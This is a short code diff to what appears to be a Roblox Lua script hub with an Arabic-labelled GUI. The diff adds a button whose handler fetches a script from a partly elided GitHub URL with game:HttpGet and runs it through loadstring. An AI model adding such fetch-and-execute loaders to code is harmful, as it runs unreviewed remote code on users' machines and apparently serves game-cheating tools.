@@ -353,6 +353,11 @@ Tab9Section:NewTextBox("هنا اكتب", "Open /Console", function(txt)
 	print(txt)
 
 end)
+Tab10Section:NewButton("انجليزيه اللغة", "What?", function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/P047/.../main/....phub"))()
+
+end)
 
 game:GetService("StarterGui"):SetCore("SendNotification", { 
 
